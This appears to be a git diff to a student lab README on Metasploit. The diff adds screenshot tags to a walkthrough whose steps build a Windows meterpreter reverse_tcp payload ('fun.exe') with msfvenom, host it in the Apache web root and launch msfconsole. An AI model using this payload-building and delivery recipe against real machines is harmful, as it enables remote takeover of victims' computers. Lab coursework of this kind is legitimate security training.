@@ -26,31 +26,37 @@ Open terminal and try execute some kali linux commands
 Find the attackers ip address using ifconfig
 ## OUTPUT:
 
+<img width="883" height="328" alt="01-ifconfig" src="https://github.com/user-attachments/assets/5ccf5911-48d1-44f1-8188-841636713ea7" />
 
 
 Create a malicious executable file fun.exe using msfvenom command
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
 ## OUTPUT:
 
+<img width="880" height="125" alt="02-msfvenom-generate" src="https://github.com/user-attachments/assets/a8bdfc50-a956-4e3b-8d69-f3767441e092" />
 
 copy the fun.exe into the apache /var/www/html folder
 ## OUTPUT:
 
+<img width="880" height="125" alt="03-msfvenom-copy" src="https://github.com/user-attachments/assets/41e7cf16-cd39-424c-80e2-d722878bcd53" />
 
 Start apache server
 sudo systemctl apache2 start
 ## OUTPUT:
+<img width="812" height="52" alt="04-apache-start" src="https://github.com/user-attachments/assets/4eef07c6-cfd4-40b0-8712-4908084d7f73" />
 
 
 Check the status of apache2
 ## OUTPUT:
 
+<img width="941" height="400" alt="05-apache-status" src="https://github.com/user-attachments/assets/8ab5fd29-e494-47be-b3a9-f696995ac457" />
 
 
 Invoke msfconsole:
 ## OUTPUT:
 
 
+<img width="913" height="540" alt="06-msfconsole" src="https://github.com/user-attachments/assets/37131137-d0d6-4a33-8c76-0c9f9ce0dafc" />
 
 
 Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole.
